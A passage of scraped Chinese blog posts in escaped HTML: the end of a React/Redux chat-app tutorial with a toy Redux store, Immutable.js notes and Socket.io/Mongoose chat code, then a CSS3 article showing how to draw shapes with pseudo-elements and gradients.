的简易半成品已经完成了，我们可以来执行下以下代码</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> initState = {<span class=\"hljs-attr\">value</span>: <span class=\"hljs-number\">0</span>}\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">reducer</span>(<span class=\"hljs-params\">state = initState, action</span>) </span>{\n    <span class=\"hljs-keyword\">switch</span> (action.type) {\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'increase'</span>:\n            <span class=\"hljs-keyword\">return</span> {...state, <span class=\"hljs-attr\">value</span>: state.value + <span class=\"hljs-number\">1</span>}\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'decrease'</span>: {\n            <span class=\"hljs-keyword\">return</span> {...state, <span class=\"hljs-attr\">value</span>: state.value - <span class=\"hljs-number\">1</span>}\n        }\n    }\n    <span class=\"hljs-keyword\">return</span> state\n}\n<span class=\"hljs-keyword\">const</span> store = <span class=\"hljs-keyword\">new</span> Store(initState, reducer)\nstore.dispatch({<span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">'increase'</span>})\n<span class=\"hljs-built_in\">console</span>.log(store.getState()); <span class=\"hljs-comment\">// -&gt; 1</span>\nstore.dispatch({<span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">'increase'</span>})\n<span class=\"hljs-built_in\">console</span>.log(store.getState()); <span class=\"hljs-comment\">// -&gt; 2</span>\n</code></pre><p>最后一步让我们来完成 subscribe 函数， subscribe 函数调用如下</p>\n<pre><code class=\"hljs js\" lang=\"js\">store.subscribe(<span class=\"hljs-function\"><span class=\"hljs-params\">()</span> =&gt;</span>\n  <span class=\"hljs-built_in\">console</span>.log(store.getState())\n)\n</code></pre><p>所以 subscribe 函数应该接收一个函数参数，将该函数参数 push 进数组中，并且调用该函数</p>\n<pre><code class=\"hljs js\" lang=\"js\">subscribe(fn) {\n    <span class=\"hljs-keyword\">this</span>.subscribers = [...this.subscribers, fn];\n    fn(<span class=\"hljs-keyword\">this</span>.value);\n}\n<span class=\"hljs-keyword\">constructor</span>(initState, reducer) {\n    <span class=\"hljs-keyword\">this</span>._state = initState\n    <span class=\"hljs-keyword\">this</span>._reducer = reducer\n    <span class=\"hljs-keyword\">this</span>.subscribers = []\n}\n</code></pre><p>自此，一个简单的 Redux 的内部逻辑就完成了，大家可以运行下代码试试。</p>\n<p>Redux 中间件的实现我会在课程中讲解，这里就先放下。通过这段分析，我相信大家应该不会对 Redux 还是很迷惑了。</p>\n<h4 class=\"heading\" data-id=\"heading-9\">Immutable.js</h4>\n<p>我在该项目中使用了该库，具体使用大家可以看项目，这里讲一下这个库到底解决了什么问题。</p>\n<p>首先 JS 的对象都是引用关系，当然你可以深拷贝一个对象，但是这个操作对于复杂数据结构来说是相当损耗性能的。</p>\n<p>Immutable 就是解决这个问题而产生的。这个库的数据类型都是不可变的，当你想改变其中的数据时，他会clone 该节点以及它的父节点，所以操作起来是相当高效的。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/1/160ad5cb130a8bb4?imageslim\" data-width=\"613\" data-height=\"575\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;613&quot; height=&quot;575&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>这个库带来的好处是相当大的：\n- 防止了异步安全问题\n- 高性能，并且对于做 React 渲染优化提供了很大帮助\n- 强大的语法糖\n- 时空穿梭 （就是撤销恢复）</p>\n<p>当然缺点也是有点：\n- 项目倾入性太大 （不推荐老项目使用）\n- 有学习成本\n- 经常忘了重新赋值。。。</p>\n<p>对于 Immutable.js 的使用也会在视频中讲述</p>\n<h4 class=\"heading\" data-id=\"heading-10\">性能优化</h4>\n<ul>\n<li>减少不必要的渲染次数</li>\n<li>使用良好的数据结构</li>\n<li>数据缓存，使用 Reselect</li>\n</ul>\n<p>具体该如何实现性能优化，在课程的后期也会讲述</p>\n<h4 class=\"heading\" data-id=\"heading-11\">聊天相关</h4>\n<p>在聊天功能中我用了 Socket.io 这个库。该库会在支持的浏览器上使用 Websocket，不支持的会降级使用别的协议。</p>\n<p>Websocket 底下使用了 TCP 协议，在生产环境中，对于 TCP 的长链接理论上只需要保证服务端收到消息并且回复一个 ACK 就行。</p>\n<p>在该项目的聊天数据库结构设计上，我将每个聊天存储为一个 Document，这样后续只需要给这个 Document 的 messages 字段 push 消息就行。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> chatSchema = <span class=\"hljs-keyword\">new</span> Schema({\n  <span class=\"hljs-attr\">messageId</span>: <span class=\"hljs-built_in\">String</span>,\n  <span class=\"hljs-comment\">// 聊天双方</span>\n  bothSide: [\n    {\n      <span class=\"hljs-attr\">user</span>: {\n        <span class=\"hljs-attr\">type</span>: Schema.Types.ObjectId\n      },\n      <span class=\"hljs-attr\">name</span>: {\n        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-built_in\">String</span>\n      },\n      <span class=\"hljs-attr\">lastId</span>: {\n        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-built_in\">String</span>\n      }\n    }\n  ],\n  <span class=\"hljs-attr\">messages</span>: [\n    {\n      <span class=\"hljs-comment\">// 发送方</span>\n      <span class=\"hljs-keyword\">from</span>: {\n        <span class=\"hljs-attr\">type</span>: Schema.Types.ObjectId,\n        <span class=\"hljs-attr\">ref</span>: <span class=\"hljs-string\">\"user\"</span>\n      },\n      <span class=\"hljs-comment\">// 接收方</span>\n      to: {\n        <span class=\"hljs-attr\">type</span>: Schema.Types.ObjectId,\n        <span class=\"hljs-attr\">ref</span>: <span class=\"hljs-string\">\"user\"</span>\n      },\n      <span class=\"hljs-comment\">// 发送的消息</span>\n      message: <span class=\"hljs-built_in\">String</span>,\n      <span class=\"hljs-comment\">// 发送日期</span>\n      date: { <span class=\"hljs-attr\">type</span>: <span class=\"hljs-built_in\">Date</span>, <span class=\"hljs-attr\">default</span>: <span class=\"hljs-built_in\">Date</span>.now }\n    }\n  ]\n});\n<span class=\"hljs-comment\">// 聊天具体后端逻辑</span>\n<span class=\"hljs-built_in\">module</span>.exports = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{\n  io.on(<span class=\"hljs-string\">\"connection\"</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">client</span>) </span>{\n    <span class=\"hljs-comment\">// 将用户存储一起</span>\n    client.on(<span class=\"hljs-string\">\"user\"</span>, user =&gt; {\n      clients[user] = client.id;\n      client.user = user;\n    });\n    <span class=\"hljs-comment\">// 断开连接清除用户信息</span>\n    client.on(<span class=\"hljs-string\">\"disconnect\"</span>, () =&gt; {\n      <span class=\"hljs-keyword\">if</span> (client.user) {\n        <span class=\"hljs-keyword\">delete</span> clients[client.user];\n      }\n    });\n    <span class=\"hljs-comment\">// 发送聊天对象昵称</span>\n    client.on(<span class=\"hljs-string\">\"getUserName\"</span>, id =&gt; {\n      User.findOne({ <span class=\"hljs-attr\">_id</span>: id }, (error, user) =&gt; {\n        <span class=\"hljs-keyword\">if</span> (user) {\n          client.emit(<span class=\"hljs-string\">\"userName\"</span>, user.user);\n        } <span class=\"hljs-keyword\">else</span> {\n          client.emit(<span class=\"hljs-string\">\"serverError\"</span>, { <span class=\"hljs-attr\">errorMsg</span>: <span class=\"hljs-string\">\"找不到该用户\"</span> });\n        }\n      });\n    });\n    <span class=\"hljs-comment\">// 接收信息</span>\n    client.on(<span class=\"hljs-string\">\"sendMessage\"</span>, data =&gt; {\n      <span class=\"hljs-keyword\">const</span> { <span class=\"hljs-keyword\">from</span>, to, message } = data;\n      <span class=\"hljs-keyword\">const</span> messageId = [<span class=\"hljs-keyword\">from</span>, to].sort().join(<span class=\"hljs-string\">\"\"</span>);\n      <span class=\"hljs-keyword\">const</span> obj = {\n        <span class=\"hljs-keyword\">from</span>,\n        to,\n        message,\n        <span class=\"hljs-attr\">date</span>: <span class=\"hljs-built_in\">Date</span>()\n      };\n      <span class=\"hljs-comment\">// 异步操作，找到聊天双方</span>\n      <span class=\"hljs-keyword\">async</span>.parallel(\n        [\n          <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">callback</span>) </span>{\n            User.findOne({ <span class=\"hljs-attr\">_id</span>: <span class=\"hljs-keyword\">from</span> }, (error, user) =&gt; {\n              <span class=\"hljs-keyword\">if</span> (error || !user) {\n                callback(error, <span class=\"hljs-literal\">null</span>);\n              }\n              callback(<span class=\"hljs-literal\">null</span>, { <span class=\"hljs-attr\">from</span>: user.user });\n            });\n          },\n          <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">callback</span>) </span>{\n            User.findOne({ <span class=\"hljs-attr\">_id</span>: to }, (error, user) =&gt; {\n              <span class=\"hljs-keyword\">if</span> (error || !user) {\n                callback(error, <span class=\"hljs-literal\">null</span>);\n              }\n              callback(<span class=\"hljs-literal\">null</span>, { <span class=\"hljs-attr\">to</span>: user.user });\n            });\n          }\n        ],\n        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err, results</span>) </span>{\n          <span class=\"hljs-keyword\">if</span> (err) {\n            client.emit(<span class=\"hljs-string\">\"error\"</span>, { <span class=\"hljs-attr\">errorMsg</span>: <span class=\"hljs-string\">\"找不到聊天对象\"</span> });\n          } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-comment\">// 寻找该 messageId 是否存在</span>\n            Chat.findOne({\n              messageId\n            }).exec(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err, doc</span>) </span>{\n              <span class=\"hljs-comment\">// 不存在就自己创建保存</span>\n              <span class=\"hljs-keyword\">if</span> (!doc) {\n                <span class=\"hljs-keyword\">var</span> chatModel = <span class=\"hljs-keyword\">new</span> Chat({\n                  messageId,\n                  <span class=\"hljs-attr\">bothSide</span>: [\n                    {\n                      <span class=\"hljs-attr\">user</span>: <span class=\"hljs-keyword\">from</span>,\n                      <span class=\"hljs-attr\">name</span>: results[<span class=\"hljs-number\">0</span>].hasOwnProperty(<span class=\"hljs-string\">\"from\"</span>)\n                        ? results[<span class=\"hljs-number\">0</span>].from\n                        : results[<span class=\"hljs-number\">1</span>].from\n                    },\n                    {\n                      <span class=\"hljs-attr\">user</span>: to,\n                      <span class=\"hljs-attr\">name</span>: results[<span class=\"hljs-number\">0</span>].hasOwnProperty(<span class=\"hljs-string\">\"to\"</span>)\n                        ? results[<span class=\"hljs-number\">0</span>].to\n                        : results[<span class=\"hljs-number\">1</span>].to\n                    }\n                  ],\n                  <span class=\"hljs-attr\">messages</span>: [obj]\n                });\n                chatModel.save(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err, chat</span>) </span>{\n                  <span class=\"hljs-keyword\">if</span> (err || !chat) {\n                    client.emit(<span class=\"hljs-string\">\"serverError\"</span>, { <span class=\"hljs-attr\">errorMsg</span>: <span class=\"hljs-string\">\"后端出错\"</span> });\n                  }\n                  <span class=\"hljs-keyword\">if</span> (clients[to]) {\n                    <span class=\"hljs-comment\">// 该 messageId 不存在就得发送发送方昵称</span>\n                    io.to(clients[to]).emit(<span class=\"hljs-string\">\"message\"</span>, {\n                      <span class=\"hljs-attr\">obj</span>: chat.messages[chat.messages.length - <span class=\"hljs-number\">1</span>],\n                      <span class=\"hljs-attr\">name</span>: results[<span class=\"hljs-number\">0</span>].hasOwnProperty(<span class=\"hljs-string\">\"from\"</span>)\n                        ? results[<span class=\"hljs-number\">0</span>].from\n                        : results[<span class=\"hljs-number\">1</span>].from\n                    });\n                  }\n                });\n              } <span class=\"hljs-keyword\">else</span> {\n                doc.messages.push(obj);\n\n                doc.save(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err, chat</span>) </span>{\n                  <span class=\"hljs-keyword\">if</span> (err || !chat) {\n                    client.emit(<span class=\"hljs-string\">\"serverError\"</span>, { <span class=\"hljs-attr\">errorMsg</span>: <span class=\"hljs-string\">\"后端出错\"</span> });\n                  }\n                  <span class=\"hljs-keyword\">if</span> (clients[to]) {\n                    io.to(clients[to]).emit(<span class=\"hljs-string\">\"message\"</span>, {\n                      <span class=\"hljs-attr\">obj</span>: chat.messages[chat.messages.length - <span class=\"hljs-number\">1</span>]\n                    });\n                  }\n                });\n              }\n            });\n          }\n        }\n      );\n    });\n  });\n};\n</code></pre><p>课程中的这块功能将会以重点来讲述，并且会单独开一个小视频讲解应用层及传输层必知知识。</p>\n<h3 class=\"heading\" data-id=\"heading-12\">课程相关</h3>\n<p>视频预计会在 20 小时以上，但是本人毕竟不是专职讲师，还是一线开发者，所以一周只会更新 2 - 3 小时视频，视频会在群内第一时间更新链接。</p>\n<p>因为大家太热情了，几天不到加了600多人，所以还是开通了一个订阅号用于发布视频更新。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/5/160c5b54839fcda1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"258\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;258&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-13\">最后</h3>\n<p>这是<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FKieSun%2FChat-Buy-React\" rel=\"nofollow noopener noreferrer\">项目地址</a>，觉得不错的可以给我点个 Star。</p>\n<p>本篇文章也是我 18 年的第一篇博客，祝大家新年快乐，在新的一年学习更多的知识！</p>\n</div>"},{"title":"你以为 CSS 只是个简单的布局？","avatar":"https://user-gold-cdn.xitu.io/2017/12/14/16054567805772d4?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"Chris威","create_time":"2017 年 12 月 29 日","tags":["CSS"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">CSS3 奇思妙想</h2>\n<p>前几天看了一篇文章 ， 颠覆了我对 <code>CSS</code> 认识，心中无数次蹦出一个念头：'卧槽，卧槽，还能特么这么用，这特么太叼了' ...</p>\n<p>于是我迫不及待想跟你们一起分享分享，以后你也可以在别人面前炫（装）耀（逼）了~</p>\n<p>ps：本文原创不是我，我只是搬运工，看到好东西与大家分享而已，作者 github 主页请戳 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fchokcoco\" rel=\"nofollow noopener noreferrer\">这里</a>~</p>\n<h3 class=\"heading\" data-id=\"heading-1\">装逼指南</h3>\n<p>本文中，所有的图形都是在单个标签内实现的，大量使用了 <code>CSS3</code> 中的 <code>::before</code> 、<code>::after</code> 伪元素，<code>transparent</code> 、<code>border</code>，多重线性与径向渐变，多重内外阴影，如果你的效果不尽人意，请尝试在 <code>Chrome</code> 浏览器下预览。</p>\n<h3 class=\"heading\" data-id=\"heading-2\">装逼技巧</h3>\n<p>本文所有图形都会有个容器 <code>&lt;div class=\"css-cell\"&gt;&lt;/div&gt;</code>包裹，其样式结构如下：</p>\n<pre><code>.css-cell{\n    position: relative;\n    width: 100%;\n    height: 300px;\n}\n</code></pre>\n<p>所有图形都是在容器内实现的，其结构如下：</p>\n<pre><code>&lt;!--heart--&gt;\n&lt;div class=\"css-cell\"&gt;\n    &lt;div class=\"heart\"&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n<p>天气那一块有部分会多一个容器，其结构如下：</p>\n<pre><code>&lt;div class=\"css-cell \"&gt;\n    &lt;div class=\"breeze-container\"&gt;\n        &lt;div class=\"breeze\"&gt;&lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n<p>为了方便起见，下面图形的具体实现，我只会贴出对应的类相应的样式代码~</p>\n<h3 class=\"heading\" data-id=\"heading-3\">装逼实战</h3>\n<ul>\n<li>爱心</li>\n</ul>\n<p></p><figure><img alt=\"爱心\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609b4a25453943f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"289\" data-height=\"261\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;289&quot; height=&quot;261&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用 <code>div</code> 的正方形和伪类的圆型组合而成，具体代码如下：</p>\n<pre><code>/*heart*/\n.heart{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%) rotate(45deg);\n    background: red;\n    width: 100px;\n    height: 100px;\n}\n.heart:before,\n.heart:after\n{\n    content: '';\n    position: absolute;\n    top: 0;\n    left: -50px;\n    width: 100px;\n    height: 100px;\n    border-radius: 50%;\n    background: red;\n}\n.heart:after{\n    top: -50px;\n    left: 0;\n}\n</code></pre>\n<ul>\n<li>气泡悬浮框</li>\n</ul>\n<p></p><figure><img alt=\"气泡悬浮框\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bc49342281b1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"403\" data-height=\"247\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;403&quot; height=&quot;247&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用 <code>border</code> 结合 <code>transparent</code> 特性实现，代码如下：</p>\n<pre><code>/*bubbly*/\n.bubbly{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    background: #00ccbb;\n    border-radius: 8px;\n    width: 200px;\n    padding: 40px 10px;\n    text-align: center;\n    color: white;\n    font-size: 20px;\n}\n.bubbly:after {\n    content: '';\n    position: absolute;\n    bottom: 0;\n    left: 50%;\n    border: 34px solid transparent;\n    border-top-color: #00ccbb;\n    border-bottom: 0;\n    border-left: 0;\n    margin: 0 0 -34px -17px;\n}\n</code></pre>\n<ul>\n<li>切角</li>\n</ul>\n<p></p><figure><img alt=\"切角\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bcfc3fb6ab17?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"344\" data-height=\"202\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;344&quot; height=&quot;202&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用使用线性渐变实现的，代码如下：</p>\n<pre><code>/*notching*/\n.notching{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    padding: 60px 20px;\n}\n.notching{\n    background:\n            linear-gradient(135deg, transparent 15px, deeppink 0)\n            top left,\n            linear-gradient(-135deg, transparent 15px, deeppink 0)\n            top right,\n            linear-gradient(-45deg, transparent 15px, deeppink 0)\n            bottom right,\n            linear-gradient(45deg, transparent 15px, deeppink 0)\n            bottom left;\n    background-size: 50% 50%;\n    background-repeat: no-repeat;\n}\n</code></pre>\n<ul>\n<li>弧形切角</li>\n</ul>\n<p></p><figure><img alt=\"弧形切角\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bd960a8abe5c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"399\" data-height=\"237\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;399&quot; height=&quot;237&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>使用径向渐变实现，具体实现如下：</p>\n<pre><code>/*arc*/\n.arc{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 80px;\n    padding: 80px;\n}\n.arc {\n    background:\n            radial-gradient(circle at top left,\n            transparent 15px, yellowgreen 0) top left,\n            radial-gradient(circle at top right,\n            transparent 15px, yellowgreen 0) top right,\n            radial-gradient(circle at bottom right,\n            transparent 15px, yellowgreen 0) bottom right,\n            radial-gradient(circle at bottom left,\n            transparent 15px, yellowgreen 0) bottom left;\n    background-size: 50% 50%;\n    background-repeat: no-repeat;\n}\n</code></pre>\n<ul>\n<li>梯形</li>\n</ul>\n<p></p><figure><img alt=\"梯形\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bedfbc4f9e4e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"408\" data-height=\"213\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;408&quot; height=&quot;213&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用伪类加旋转透视实现，具体实现如下：</p>\n<pre><code>/*trapezoid*/\n.trapezoid{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 160px;\n    padding: 60px;\n}\n.trapezoid:before{\n    content:\"\";\n    position: absolute;\n    top: 0; \n    right: 0;\n    bottom: 0; \n    left: 0;\n    transform:perspective(40px) scaleY(1.3) rotateX(5deg);\n    transform-origin: bottom;\n    background:dodgerblue;\n    z-index:-1;\n}\n</code></pre>\n<ul>\n<li>饼图</li>\n</ul>\n<p></p><figure><img alt=\"饼图\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bf61246a04d0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"339\" data-height=\"249\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;339&quot; height=&quot;249&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用伪类、线性渐变、旋转实现，具体代码如下：</p>\n<pre><code>/*pie*/\n.pie{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:200px;\n    border-radius:50%;\n    text-align: center;\n    background-color:yellowgreen;\n    overflow:hidden;\n    background-image: linear-gradient(to right, transparent 50%, #655 0);\n    cursor:pointer;\n}\n.pie:before{\n    content:\"\";\n    position:absolute;\n    top:0;\n    left:50%;\n    width:50%;\n    height:100%;\n    background-color: inherit;\n    transform-origin: left;\n    z-index:-1;\n    transform:rotate(.1turn);\n}\n.pie:hover:before{\n    transition:all 1s;\n    transform:rotate(.45turn);\n}\n</code></pre>\n<ul>\n<li>平行四边形</li>\n</ul>\n<p></p><figure><img alt=\"平行四边形\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c0352dacd9b9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"380\" data-height=\"220\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;380&quot; height=&quot;220&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用伪类、拉伸实现，实现过程如下：</p>\n<pre><code>/*parallelogram*/\n.parallelogram{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:120px;\n\n}\n.parallelogram:before{\n    content: '';\n    position: absolute;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    background-color:#00aabb;\n    z-index:-1;\n    transform: skew(.08turn);\n}\n</code></pre>\n<ul>\n<li>折角</li>\n</ul>\n<p></p><figure><img alt=\"折角\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c0974bbd2eff?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"360\" data-height=\"272\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;360&quot; height=&quot;272&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用切角、伪类、渐变、旋转实现，代码如下：</p>\n<pre><code>/*corner*/\n.corner{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 120px;\n    height:120px;\n    padding:40px;\n    background:linear-gradient(-150deg,transparent 1.5em, yellowgreen  0);\n    border-radius:8px;\n}\n.corner:before{\n    content: '';\n    position: absolute;\n    top: 0; right: 0;\n    background: linear-gradient(to left bottom,transparent 50%, rgba(0,0,0,.2) 0, rgba(0,0,0,.4)) 100% 0 no-repeat;\n    width: 1.73em;\n    height: 3em;\n    transform: translateY(-1.3em) rotate(-30deg);\n    transform-origin: bottom right;\n    border-bottom-left-radius: inherit;\n    box-shadow: -.2em .2em .3em -.1em rgba(0,0,0,.15);\n}\n</code></pre>\n<ul>\n<li>纯 CSS 方案实现背景变暗效果（hover按钮触发）</li>\n</ul>\n<p></p><figure><img alt=\"hover之前\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c0f767ce7bc6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"365\" data-height=\"276\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;365&quot; height=&quot;276&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>鼠标移入</p>\n<p></p><figure><img alt=\"hover之后\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c1260cb55808?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"373\" data-height=\"282\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;373&quot; height=&quot;282&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>利用 <code>box-shadow</code> 实现，具体代码如下：</p>\n<pre><code>/*spectiveBlur*/\n.spectiveBlur{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 220px;\n    height:160px;\n    transform: translate(-50%, -50%);\n    border-radius:10px;\n    overflow:hidden;\n    background:#E91E63;\n    cursor:pointer;\n    transition: transform .2s;\n}\n.spectiveBlur:hover{\n    box-shadow:0 0 0 1920px rgba(0,0,0,.7);\n    transform: translate(-50%, -50%) scale(1.2);\n}\n</code></pre>\n<ul>\n<li>条纹背景图</li>\n</ul>\n<p>主要是利用渐变实现，具体实现如下：</p>\n<p></p><figure><img alt=\"条纹背景图\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c1c08d51999a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"307\" data-height=\"267\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;307&quot; height=&quot;267&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code>/*stripe*/\n.stripe{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:200px;\n    background:deeppink;\n    border-radius:.5em;\n    background:repeating-linear-gradient(45deg,#CC9999, #CC9999 15px, #CCCCCC 0, #CCCCCC 30px)\n}\n</code></pre>\n<p></p><figure><img alt=\"条纹背景图\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c2bc6f0c78c7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"316\" data-height=\"260\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;316&quot; height=&quot;260&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code>/*wave-stripe*/\n.wave-stripe{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:200px;\n    border-radius:.5em;\n    background:\n            linear-gradient(135deg, deeppink 25%, transparent 25%) -50px 0,\n            linear-gradient(225deg, deeppink 25%, transparent 25%) -50px 0,\n            linear-gradient(315deg, deeppink 25%, transparent 25%),\n            linear-gradient(45deg, deeppink 25%, transparent 25%);\n    background-size: 40px 40px;\n}\n</code></pre>\n<p></p><figure><img alt=\"条纹背景图\" class=\"lazyload inited\" 